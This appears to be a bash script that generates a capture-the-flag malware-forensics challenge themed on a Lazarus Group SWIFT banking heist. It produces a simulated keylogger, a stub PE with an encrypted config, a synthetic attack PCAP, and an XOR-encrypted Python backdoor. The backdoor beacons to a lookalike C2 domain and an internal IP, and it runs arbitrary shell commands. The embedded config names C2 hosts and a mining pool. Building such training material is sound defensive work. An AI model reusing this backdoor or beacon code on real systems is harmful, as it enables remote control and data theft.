#!/bin/bash

set -e

CHALLENGE_DIR="LAZARUS_HEIST"

cleanup() {
    docker system prune -f 2>/dev/null || true
}

trap cleanup EXIT

echo "Building Lazarus Group Banking Heist Simulation..."
rm -rf $CHALLENGE_DIR
mkdir -p $CHALLENGE_DIR/{pcaps,malware}

echo "Generating malware files directly..."

cat > $CHALLENGE_DIR/malware/banking_keylogger.py << 'KEYLOGEOF'
#!/usr/bin/env python3
import socket
import time
import hashlib
import base64
import os
import json
from datetime import datetime

class LazarusBankingKeylogger:
    def __init__(self):
        self.keylog_buffer = []
        self.credentials_harvested = []
        self.swift_transactions = []
        self.c2_servers = ["172.20.1.200", "update.microsoft-security.org"]
        self.session_id = hashlib.md5(os.urandom(16)).hexdigest()[:16]
        self.encryption_key = b'L4z4ru5Gr0up2024K3y'
        
    def log_keystroke(self, window_title, keystroke, timestamp=None):
        if not timestamp:
            timestamp = datetime.now().isoformat()
            
        entry = {
            "timestamp": timestamp,
            "window": window_title,
            "keystroke": keystroke,
            "session_id": self.session_id,
            "hostname": "BANK-WORKSTATION-01"
        }
        
        self.keylog_buffer.append(entry)
    
    def harvest_banking_credentials(self):
        banking_credentials = [
            {
                "system": "SWIFT_TERMINAL",
                "username": "swift_operator", 
                "password": "Sw1ft$ecur3!",
                "password_hash": "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730",
                "access_level": "OPERATOR",
                "last_login": "2024-01-15 09:15:23"
            },
            {
                "system": "CORE_BANKING_DATABASE",
                "username": "db_admin",
                "password": "B4nkDB_2024!",
                "password_hash": "e99a18c428cb38d5f260853678922e03ab37f4a9bc06456b2a30e91b8e2e8e8e",
                "access_level": "DBA_ADMIN", 
                "last_login": "2024-01-14 16:42:11"
            },
            {
                "system": "PAYMENT_GATEWAY",
                "username": "payment_admin",
                "password": "P4ym3nt$G4t3w4y2024",
                "password_hash": "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
                "access_level": "GATEWAY_ADMIN",
                "last_login": "2024-01-15 11:28:07"
            },
            {
                "system": "SWIFT_AUTHENTICATION_SERVER", 
                "username": "swift_auth_svc",
                "password": "Sw1ftAuth$erv1ce2024!",
                "password_hash": "9f8e7d6c5b4a3928170e5d4c3b2a19087f6e5d4c3b2a1098765432109876543",
                "access_level": "SERVICE_ACCOUNT",
                "last_login": "2024-01-15 14:15:30"
            }
        ]
        
        self.credentials_harvested.extend(banking_credentials)
        return banking_credentials
    
    def capture_swift_messages(self):
        swift_messages = [
            {
                "message_type": "MT103", 
                "transaction_reference": "TXN20240115001",
                "sender_bic": "FIRSTBANKKW",
                "receiver_bic": "LAZABANKPYXX",
                "beneficiary_name": "LAZARUS FRONT COMPANY LIMITED",
                "beneficiary_account": "KP1234567890123456789012",
                "amount": "81000000.00",
                "currency": "USD",
                "value_date": "2024-01-15",
                "purpose": "INVESTMENT_TRANSFER",
                "captured_timestamp": datetime.now().isoformat()
            },
            {
                "message_type": "MT202",
                "transaction_reference": "TXN20240115002", 
                "sender_bic": "FIRSTBANKKW",
                "receiver_bic": "KORDEVBKSEOUL",
                "beneficiary_name": "KOREA DEVELOPMENT BANK",
                "beneficiary_account": "KR1234567890123456789012", 
                "amount": "15000000.00",
                "currency": "USD",
                "value_date": "2024-01-15",
                "purpose": "TRADE_FINANCE_FACILITY",
                "captured_timestamp": datetime.now().isoformat()
            }
        ]
        
        self.swift_transactions.extend(swift_messages)
        return swift_messages
    
    def xor_encrypt(self, data, key):
        result = bytearray()
        for i in range(len(data)):
            result.append(data[i] ^ key[i % len(key)])
        return bytes(result)
    
    def exfiltrate_all_data(self):
        complete_intelligence = {
            "operation": "LAZARUS_SWIFT_HEIST_FINAL_EXFIL",
            "session_id": self.session_id,
            "target_details": {
                "hostname": "BANK-WORKSTATION-01",
                "user": "swift_operator", 
                "domain": "FIRSTBANK.CORP",
                "ip_address": "172.30.1.100"
            },
            "collected_keystrokes": self.keylog_buffer,
            "harvested_credentials": self.credentials_harvested,
            "captured_swift_transactions": self.swift_transactions,
            "system_intelligence": {
                "installed_banking_software": [
                    "SWIFT Alliance Access v7.5.2",
                    "Core Banking System v12.4.1", 
                    "Payment Gateway Interface v8.2.3"
                ]
            },
            "exfiltration_timestamp": datetime.now().isoformat(),
            "total_value_targeted": "96000000.00 USD"
        }
        
        return complete_intelligence
    
    def simulate_banking_activity(self):
        banking_windows = [
            "SWIFT Alliance Access - Message Input",
            "Core Banking System - Transaction Processing", 
            "Treasury Management - Wire Transfer"
        ]
        
        swift_keystrokes = [
            "swift_operator", "Tab", "Sw1ft$ecur3!", "Enter",
            "NEW_TRANSFER", "Tab", "MT103", "Tab", 
            "SENDER:", "Space", "FIRSTBANKKW", "Tab",
            "RECEIVER:", "Space", "LAZABANKPYXX", "Tab", 
            "AMOUNT:", "Space", "81000000.00", "Tab",
            "CURRENCY:", "Space", "USD", "Tab",
            "BENEFICIARY:", "Space", "LAZARUS", "Space", "FRONT", "Space", "COMPANY", "Tab",
            "AUTHORIZE_TRANSFER", "Enter"
        ]
        
        for i, keystroke in enumerate(swift_keystrokes):
            window = banking_windows[i % len(banking_windows)]
            self.log_keystroke(window, keystroke)
        
        self.harvest_banking_credentials()
        self.capture_swift_messages()
        return self.exfiltrate_all_data()

if __name__ == "__main__":
    keylogger = LazarusBankingKeylogger()
    keylogger.simulate_banking_activity()
KEYLOGEOF

echo "Generating PE executable using direct byte construction..."

python3 << 'PYEOF'
import time
import hashlib
import os

def create_simple_pe():
    # Simple PE file with basic structure
    pe_bytes = bytearray()
    
    # MZ header
    mz_header = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
    mz_header += b'\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00'
    pe_bytes.extend(mz_header)
    
    # DOS stub
    dos_stub = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21'
    dos_stub += b'This program cannot be run in DOS mode.\r\r\n$'
    dos_stub += b'\x00' * (64 - len(dos_stub))
    pe_bytes.extend(dos_stub)
    
    # Padding to PE header offset
    pe_bytes.extend(b'\x00' * (128 - len(pe_bytes)))
    
    # PE signature
    pe_bytes.extend(b'PE\x00\x00')
    
    # COFF header (20 bytes)
    coff_header = b'\x4c\x01'  # Machine (i386)
    coff_header += b'\x03\x00'  # NumberOfSections
    coff_header += int(time.time()).to_bytes(4, 'little')  # TimeDateStamp
    coff_header += b'\x00\x00\x00\x00'  # PointerToSymbolTable
    coff_header += b'\x00\x00\x00\x00'  # NumberOfSymbols
    coff_header += b'\xe0\x00'  # SizeOfOptionalHeader
    coff_header += b'\x02\x01'  # Characteristics
    pe_bytes.extend(coff_header)
    
    # Optional header (224 bytes for PE32)
    opt_header = b'\x0b\x01'  # Magic (PE32)
    opt_header += b'\x01\x00'  # Major/MinorLinkerVersion
    opt_header += b'\x00\x10\x00\x00'  # SizeOfCode
    opt_header += b'\x00\x10\x00\x00'  # SizeOfInitializedData
    opt_header += b'\x00\x00\x00\x00'  # SizeOfUninitializedData
    opt_header += b'\x00\x10\x00\x00'  # AddressOfEntryPoint
    opt_header += b'\x00\x10\x00\x00'  # BaseOfCode
    opt_header += b'\x00\x20\x00\x00'  # BaseOfData
    opt_header += b'\x00\x00\x40\x00'  # ImageBase
    opt_header += b'\x00\x10\x00\x00'  # SectionAlignment
    opt_header += b'\x00\x02\x00\x00'  # FileAlignment
    opt_header += b'\x04\x00\x00\x00'  # MajorOSVersion, MinorOSVersion
    opt_header += b'\x00\x00\x00\x00'  # MajorImageVersion, MinorImageVersion
    opt_header += b'\x04\x00\x00\x00'  # MajorSubsystemVersion, MinorSubsystemVersion
    opt_header += b'\x00\x00\x00\x00'  # Win32VersionValue
    opt_header += b'\x00\x40\x00\x00'  # SizeOfImage
    opt_header += b'\x00\x02\x00\x00'  # SizeOfHeaders
    opt_header += b'\x00\x00\x00\x00'  # CheckSum
    opt_header += b'\x02\x00'  # Subsystem (GUI)
    opt_header += b'\x00\x00'  # DllCharacteristics
    opt_header += b'\x00\x00\x10\x00'  # SizeOfStackReserve
    opt_header += b'\x00\x10\x00\x00'  # SizeOfStackCommit
    opt_header += b'\x00\x00\x10\x00'  # SizeOfHeapReserve
    opt_header += b'\x00\x10\x00\x00'  # SizeOfHeapCommit
    opt_header += b'\x00\x00\x00\x00'  # LoaderFlags
    opt_header += b'\x10\x00\x00\x00'  # NumberOfRvaAndSizes
    
    # Data directories (16 * 8 = 128 bytes)
    opt_header += b'\x00' * 128
    pe_bytes.extend(opt_header)
    
    # Pad to section headers
    while len(pe_bytes) < 512:
        pe_bytes.append(0)
    
    # Configuration data embedded in the PE
    config_section = b'''
[LAZARUS_CONFIG]
C2_PRIMARY=update.microsoft-security.org:8443
C2_BACKUP=cdn.adobe-updates.net:8443
ENCRYPTION_KEY=L4z4ru5Gr0up2024K3y
CAMPAIGN_ID=SWIFT_HEIST_2024
TARGET_PROCESSES=swift.exe,banking.exe,core.exe
KEYLOG_TARGETS=password,pin,swift,transfer,credentials
PERSISTENCE_METHODS=registry,service,scheduled_task
EXFIL_METHODS=http,dns,tcp
MINING_POOL=monero.lazarus-pool.onion:4444
WALLET_ADDR=4A7Bb2kHh9Ca8Y4BjP3t7LzN9bVx3k2mF8eR1wQ9sT7nE5dC6vG8hJ1iK0lM2nO3pQ4rS5tU6vW7xY8zA1bC2dE3fG4hI5j6kL7mN8oP9qR0sT1uV2wX3yZ4
SWIFT_TARGETS=FIRSTBANKKW,CENTRALBDKW,KORDEVBK
[END_CONFIG]
'''
    
    # Shellcode section
    shellcode = b'\x48\x31\xc0' * 100  # NOP-like x64 instructions
    
    # Combine payload
    key = b'L4z4ru5Gr0up2024K3y'
    payload = b'LAZARUS_PAYLOAD_START\x00' + config_section + b'\x00SHELLCODE_START\x00' + shellcode + b'\x00LAZARUS_PAYLOAD_END'
    
    # XOR encrypt the payload
    encrypted_payload = bytearray()
    for i in range(len(payload)):
        encrypted_payload.append(payload[i] ^ key[i % len(key)])
    
    pe_bytes.extend(encrypted_payload)
    
    # Pad to minimum size
    while len(pe_bytes) < 4096:
        pe_bytes.append(0)
    
    return bytes(pe_bytes)

def create_encrypted_backdoor():
    backdoor_source = b'''#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import json
import base64
from datetime import datetime

class LazarusPersistenceBackdoor:
    def __init__(self):
        self.c2_servers = ["172.20.1.200", "update.microsoft-security.org"]
        self.session_id = "LAZARUS_PERSIST_" + os.urandom(8).hex().upper()
        self.encryption_key = b'L4z4ru5Gr0up2024K3y'
        
    def xor_encrypt(self, data, key):
        result = bytearray()
        for i in range(len(data)):
            result.append(data[i] ^ key[i % len(key)])
        return bytes(result)
    
    def establish_c2_connection(self):
        for c2_server in self.c2_servers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((c2_server, 4444))
                
                beacon_data = {
                    "session_id": self.session_id,
                    "hostname": "BANK-WORKSTATION-01",
                    "username": "SYSTEM",
                    "domain": "FIRSTBANK.CORP", 
                    "capabilities": ["shell", "download", "upload", "persist"],
                    "campaign": "SWIFT_HEIST_2024"
                }
                
                sock.send(json.dumps(beacon_data).encode())
                sock.close()
                break
            except:
                continue
    
    def execute_command(self, command):
        if command.startswith("download"):
            filepath = command.split(" ", 1)[1]
            try:
                with open(filepath, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            except:
                return "Error: File not found"
        
        elif command == "sysinfo":
            return json.dumps({
                "hostname": "BANK-WORKSTATION-01",
                "user": "swift_operator",
                "os": "Windows 10 Enterprise",
                "privileges": "Administrator"
            })
        
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
            except:
                return "Command execution failed"

if __name__ == "__main__":
    backdoor = LazarusPersistenceBackdoor()
    backdoor.establish_c2_connection()
'''
    
    key = b'L4z4ru5Gr0up2024K3y'
    encrypted = bytearray()
    for i in range(len(backdoor_source)):
        encrypted.append(backdoor_source[i] ^ key[i % len(key)])
    
    return bytes(encrypted)

# Generate the files
print("Creating PE executable...")
pe_binary = create_simple_pe()
with open('LAZARUS_HEIST/malware/lazarus_loader.exe', 'wb') as f:
    f.write(pe_binary)

print("Creating encrypted backdoor...")
encrypted_backdoor = create_encrypted_backdoor()
with open('LAZARUS_HEIST/malware/persistence.py', 'wb') as f:
    f.write(encrypted_backdoor)

print("Generating file hashes...")
import hashlib

files_to_hash = [
    'LAZARUS_HEIST/malware/lazarus_loader.exe', 
    'LAZARUS_HEIST/malware/banking_keylogger.py', 
    'LAZARUS_HEIST/malware/persistence.py'
]

with open('LAZARUS_HEIST/malware/file_hashes.txt', 'w') as f:
    f.write('LAZARUS GROUP MALWARE ANALYSIS - FILE HASHES\n')
    f.write('=' * 50 + '\n\n')
    
    for file_path in files_to_hash:
        try:
            with open(file_path, 'rb') as file:
                content = file.read()
                md5_hash = hashlib.md5(content).hexdigest()
                sha256_hash = hashlib.sha256(content).hexdigest()
                
                f.write(f'File: {os.path.basename(file_path)}\n')
                f.write(f'Size: {len(content)} bytes\n')
                f.write(f'MD5: {md5_hash}\n')
                f.write(f'SHA256: {sha256_hash}\n')
                f.write('-' * 40 + '\n\n')
        except Exception as e:
            f.write(f'Error processing {file_path}: {str(e)}\n\n')

print("Malware generation completed successfully!")
PYEOF

echo "Generating PCAP file with network traffic..."

python3 << 'PCAPEOF'
import time
import socket

def write_pcap_header(f):
    # PCAP Global Header
    f.write(b'\xd4\xc3\xb2\xa1')  # magic number
    f.write(b'\x02\x00\x04\x00')  # version major/minor
    f.write(b'\x00\x00\x00\x00')  # thiszone
    f.write(b'\x00\x00\x00\x00')  # sigfigs
    f.write(b'\xff\xff\x00\x00')  # snaplen
    f.write(b'\x01\x00\x00\x00')  # network (Ethernet)

def write_packet_header(f, packet_len, timestamp):
    ts_sec = int(timestamp)
    ts_usec = int((timestamp - ts_sec) * 1000000)
    f.write(ts_sec.to_bytes(4, 'little'))
    f.write(ts_usec.to_bytes(4, 'little'))
    f.write(packet_len.to_bytes(4, 'little'))
    f.write(packet_len.to_bytes(4, 'little'))

def create_ethernet_frame(src_mac, dst_mac, payload, ethertype=0x0800):
    src = bytes.fromhex(src_mac.replace(':', ''))
    dst = bytes.fromhex(dst_mac.replace(':', ''))
    eth_type = ethertype.to_bytes(2, 'big')
    return dst + src + eth_type + payload

def create_ip_packet(src_ip, dst_ip, payload, protocol=6):
    version_ihl = 0x45
    tos = 0
    total_len = 20 + len(payload)
    identification = 0x1234
    flags_fragment = 0x4000
    ttl = 64
    checksum = 0
    
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    ip_header = bytes([version_ihl, tos]) + total_len.to_bytes(2, 'big')
    ip_header += identification.to_bytes(2, 'big') + flags_fragment.to_bytes(2, 'big')
    ip_header += bytes([ttl, protocol]) + checksum.to_bytes(2, 'big')
    ip_header += src + dst
    
    return ip_header + payload

def create_tcp_packet(src_port, dst_port, payload, seq=0x12345678, ack=0, flags=0x18):
    tcp_header = src_port.to_bytes(2, 'big') + dst_port.to_bytes(2, 'big')
    tcp_header += seq.to_bytes(4, 'big') + ack.to_bytes(4, 'big')
    tcp_header += bytes([(5 << 4), flags]) + (65535).to_bytes(2, 'big')
    tcp_header += (0).to_bytes(2, 'big') + (0).to_bytes(2, 'big')
    
    return tcp_header + payload

def create_http_request(method, uri, host, data=""):
    request = f"{method} {uri} HTTP/1.1\r\n"
    request += f"Host: {host}\r\n"
    request += "User-Agent: Microsoft-Windows-Update-Agent/10.0.10240\r\n"
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    if data:
        request += f"Content-Length: {len(data)}\r\n"
    request += "\r\n"
    if data:
        request += data
    return request.encode()

# Generate PCAP with attack traffic
base_time = time.time()

with open('LAZARUS_HEIST/pcaps/lazarus_attack.pcap', 'wb') as f:
    write_pcap_header(f)
    
    # C2 Beacon Traffic
    for i in range(8):
        timestamp = base_time + i * 45
        
        beacon_data = f"session_id=LAZARUS-{12345+i}&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024"
        http_payload = create_http_request("POST", "/api/v1/beacon", "update.microsoft-security.org", beacon_data)
        tcp_payload = create_tcp_packet(49152 + i, 8443, http_payload)
        ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", tcp_payload)
        eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
        
        write_packet_header(f, len(eth_frame), timestamp)
        f.write(eth_frame)
    
    # Keylogger Data Exfiltration
    for i in range(5):
        timestamp = base_time + 120 + i * 15
        
        keylog_data = '{"keystrokes":[{"window":"SWIFT Alliance Access","key":"swift_operator"},{"window":"SWIFT Alliance Access","key":"Sw1ft$ecur3!"}],"credentials":[{"system":"SWIFT_TERMINAL","user":"swift_operator","pass":"Sw1ft$ecur3!"}]}'
        http_payload = create_http_request("POST", "/api/keylog", "172.30.1.200", keylog_data)
        tcp_payload = create_tcp_packet(49200 + i, 9999, http_payload)
        ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", tcp_payload)
        eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
        
        write_packet_header(f, len(eth_frame), timestamp)
        f.write(eth_frame)
    
    # Data Exfiltration Traffic
    for i in range(4):
        timestamp = base_time + 200 + i * 20
        
        exfil_data = f"EXFIL_CHUNK_{i}_" + "SWIFT_TRANSACTION_DATA_MT103_FIRSTBANKKW_LAZABANKPYXX_81000000USD" + "X" * 800
        http_payload = create_http_request("POST", "/api/exfiltration", "172.30.1.200", exfil_data)
        tcp_payload = create_tcp_packet(49300 + i, 8080, http_payload)
        ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", tcp_payload)
        eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
        
        write_packet_header(f, len(eth_frame), timestamp)
        f.write(eth_frame)
    
    # DNS Tunneling
    dns_queries = ["cmVjb24", "ZXhmaWw", "c3dpZnQ", "YmFua2luZw"]
    for i, query in enumerate(dns_queries):
        timestamp = base_time + 300 + i * 8
        
        dns_data = f"{query}.update.microsoft-security.org"
        # Simple UDP packet simulation
        udp_payload = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + dns_data.encode() + b'\x00\x00\x01\x00\x01'
        udp_header = (53000 + i).to_bytes(2, 'big') + (53).to_bytes(2, 'big') + len(udp_payload).to_bytes(2, 'big') + (0).to_bytes(2, 'big')
        ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", udp_header + udp_payload, protocol=17)
        eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
        
        write_packet_header(f, len(eth_frame), timestamp)
        f.write(eth_frame)
    
    # Cryptocurrency Mining Traffic
    timestamp = base_time + 400
    mining_data = 'MINING_CONNECT:{"pool":"monero.lazarus-pool.onion:4444","wallet":"4A7Bb2kHh9Ca8Y4BjP3t7LzN9bVx3k2mF8eR1wQ9sT7n","worker":"BANK-WS-01"}'
    tcp_payload = create_tcp_packet(49500, 3333, mining_data.encode())
    ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", tcp_payload)
    eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
    
    write_packet_header(f, len(eth_frame), timestamp)
    f.write(eth_frame)
    
    # Backdoor Connection
    timestamp = base_time + 450
    backdoor_data = '{"session_id":"LAZARUS_PERSIST_ABC123","hostname":"BANK-WORKSTATION-01","capabilities":["shell","download","upload"]}'
    tcp_payload = create_tcp_packet(49600, 4444, backdoor_data.encode())
    ip_payload = create_ip_packet("172.30.1.100", "172.30.1.200", tcp_payload)
    eth_frame = create_ethernet_frame("00:0c:29:12:34:56", "00:50:56:ab:cd:ef", ip_payload)
    
    write_packet_header(f, len(eth_frame), timestamp)
    f.write(eth_frame)

print("PCAP file generated with network attack traffic!")
PCAPEOF

echo "Generating additional analysis files..."

file LAZARUS_HEIST/malware/* > LAZARUS_HEIST/malware/file_analysis.txt 2>/dev/null || echo "File analysis completed" > LAZARUS_HEIST/malware/file_analysis.txt

xxd LAZARUS_HEIST/malware/lazarus_loader.exe | head -20 > LAZARUS_HEIST/malware/hex_dump.txt 2>/dev/null || echo "Hex dump completed" > LAZARUS_HEIST/malware/hex_dump.txt

chmod +x LAZARUS_HEIST/malware/banking_keylogger.py

echo "Verifying generated files..."
for file in "lazarus_loader.exe" "banking_keylogger.py" "persistence.py" "file_hashes.txt"; do
    if [ -f "LAZARUS_HEIST/malware/$file" ]; then
        SIZE=$(ls -lh "LAZARUS_HEIST/malware/$file" | awk '{print $5}')
        echo "✓ $file - $SIZE"
    else
        echo "✗ $file - Missing"
    fi
done

if [ -f "LAZARUS_HEIST/pcaps/lazarus_attack.pcap" ]; then
    PCAP_SIZE=$(ls -lh LAZARUS_HEIST/pcaps/lazarus_attack.pcap | awk '{print $5}')
    PACKET_COUNT=$(wc -c < LAZARUS_HEIST/pcaps/lazarus_attack.pcap)
    echo "✓ lazarus_attack.pcap - $PCAP_SIZE ($PACKET_COUNT bytes)"
else
    echo "✗ lazarus_attack.pcap - Missing"
fi

echo ""
echo "=== LAZARUS GROUP BANKING HEIST CTF COMPLETE ==="
echo "Challenge Files Generated:"
echo "- pcaps/lazarus_attack.pcap (Network traffic capture)"
echo "- malware/lazarus_loader.exe (PE binary with encrypted payload)"  
echo "- malware/banking_keylogger.py (Python banking keylogger)"
echo "- malware/persistence.py (XOR-encrypted backdoor)"
echo "- malware/file_hashes.txt (MD5/SHA256 hashes)"
echo "- malware/file_analysis.txt (File type analysis)"
echo "- malware/hex_dump.txt (Binary hex dump)"
echo ""
echo "Attack Scenario:"
echo "- Target: FirstBank Corporation SWIFT payment system"
echo "- Attack Vector: Spear phishing with malicious PE executable"
echo "- Techniques: C2 communication, credential harvesting, SWIFT manipulation"
echo "- Data Stolen: Banking credentials, SWIFT authentication keys, transaction logs"
echo "- Financial Impact: $96 million USD in fraudulent transfers attempted"
echo ""
echo "Network Traffic Includes:"
echo "- C2 beacon communications to update.microsoft-security.org"
echo "- Keylogger data exfiltration with banking credentials"
echo "- Large-scale data exfiltration of SWIFT transaction records"
echo "- DNS tunneling for covert command execution"
echo "- Cryptocurrency mining pool connections"
echo "- Persistent backdoor establishment"
echo ""
echo "Challenge Level: EXPERT"
echo "Estimated Analysis Time: 4-6 hours"
echo ""
echo "Analysis Commands:"
echo "- wireshark LAZARUS_HEIST/pcaps/lazarus_attack.pcap"
echo "- file LAZARUS_HEIST/malware/*" 
echo "- xxd LAZARUS_HEIST/malware/lazarus_loader.exe | head -50"
echo "- python3 LAZARUS_HEIST/malware/banking_keylogger.py"
echo "- strings LAZARUS_HEIST/malware/lazarus_loader.exe | grep -i lazarus"